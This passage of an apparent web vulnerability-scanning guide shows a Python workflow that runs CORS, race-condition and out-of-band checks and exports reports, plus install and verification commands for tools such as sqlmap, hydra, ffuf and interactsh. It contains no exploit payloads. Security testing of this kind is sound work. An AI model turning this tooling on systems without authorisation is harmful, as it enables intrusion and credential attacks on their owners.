        cors = CORSTester(self.target, self.output_dir)
        cors_results = cors.test_cors(self.target)
        results['cors'] = cors_results

        for test in cors_results:
            if test.get('vulnerability_level') in ['high', 'critical']:
                self.reporter.add_finding(
                    "CORS Misconfiguration",
                    test.get('vulnerability_level').capitalize(),
                    f"Origin {test.get('origin_tested')} is reflected with credentials",
                    evidence=str(test)
                )

        # Race Condition Testing
        print("[*] Testing for race conditions...")
        race = RaceConditionTester(self.target, self.output_dir)
        race_results = race.test_race(self.target)
        results['race_condition'] = race_results

        if race_results.get('potential_vuln'):
            self.reporter.add_finding(
                "Potential Race Condition",
                "Medium",
                "Inconsistent responses detected during parallel requests",
                evidence=str(race_results)
            )

        # Check OOB interactions
        if self.oob:
            print("[*] Checking for OOB interactions...")
            interactions = self.oob.wait_for_interaction(timeout=10)
            if interactions:
                self.reporter.add_finding(
                    "Out-of-Band Interaction Detected",
                    "High",
                    "External callback received indicating blind vulnerability",
                    evidence=str(interactions)
                )
            self.oob.stop()

        # Generate reports
        print("[*] Generating reports...")
        self.reporter.export_json()
        self.reporter.export_html()
        self.reporter.export_markdown()

        return results


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='Advanced Vulnerability Scanner')
    parser.add_argument('--target', '-t', required=True, help='Target URL')
    parser.add_argument('--output', '-o', default='./output/advanced', help='Output directory')
    parser.add_argument('--params', '-p', nargs='+', help='Parameters to test')

    args = parser.parse_args()

    workflow = AdvancedVulnWorkflow(args.target, args.output)
    workflow.run_full_scan(args.params)
```

## 6.4 Validation
```bash
# Test reporting
python3 -c "from utils.advanced_reporter import AdvancedReporter; r = AdvancedReporter(); print('Reporter OK')"

# Test jinja2
python3 -c "from jinja2 import Template; print('Jinja2 OK')"
```

---

# Quick Reference - All Installation Commands

```bash
#!/bin/bash
# Complete installation script

# Phase 1: Discovery
go install github.com/OJ/gobuster/v3@latest
go install github.com/sensepost/gowitness@latest
go install github.com/lc/subjs@latest
go install github.com/Sh1Yo/x8@latest
pip install dirsearch wfuzz

# Phase 2: Proxy & Fuzzing
pip install python-owasp-zap-v2.4 mitmproxy
go install github.com/ffuf/ffuf/v2@latest
pip install pycryptodome base58 python-jose

# Phase 3: Injection
pip install sqlmap --upgrade
pip install ldap3 lxml

# Phase 3.5: Advanced
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
pip install aiohttp h2 python-magic

# Phase 4: API
go install github.com/assetnote/kiterunner/cmd/kr@latest
npm install -g newman
pip install graphql-core gql websocket-client websockets openapi-spec-validator prance pyjwt python-jose

# Phase 5: Auth
sudo apt install hydra -y
pip install pyjwt

# Phase 6: Reporting
pip install reportlab weasyprint sqlalchemy alembic jinja2 markdown

echo "Installation complete!"
```

---

# Verification Checklist

After completing each phase, run these checks:

```bash
# Phase 1
gobuster version && dirsearch --help && gowitness --help

# Phase 2
python3 -c "from zapv2 import ZAPv2" && ffuf -V

# Phase 3
sqlmap --version && python3 -c "import ldap3; import lxml"

# Phase 3.5
interactsh-client -version && python3 -c "import aiohttp; import magic"

# Phase 4
kr --help && newman --version && python3 -c "import websocket; from gql import gql"

# Phase 5
hydra -h && python3 -c "import jwt"

# Phase 6
python3 -c "from jinja2 import Template; from reportlab.lib import colors"
```
